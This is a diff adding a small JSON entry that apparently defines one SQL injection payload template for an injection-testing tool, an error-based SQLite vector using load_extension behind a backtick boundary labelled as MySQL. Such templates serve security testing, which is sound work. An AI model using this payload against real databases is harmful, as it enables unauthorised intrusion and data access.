@@ -1,0 +1,12 @@
+{
+ "dbms": "sqlite",
+ "technique": "error",
+ "boundary": {
+  "prefix": "`",
+  "suffix": "",
+  "type": "backtick",
+  "desc": "backtick-quoted (MySQL)"
+ },
+ "vector": "{B} AND 1=load_extension(({Q}))",
+ "comment": "sqlite error via backtick-quoted (MySQL)"
+}
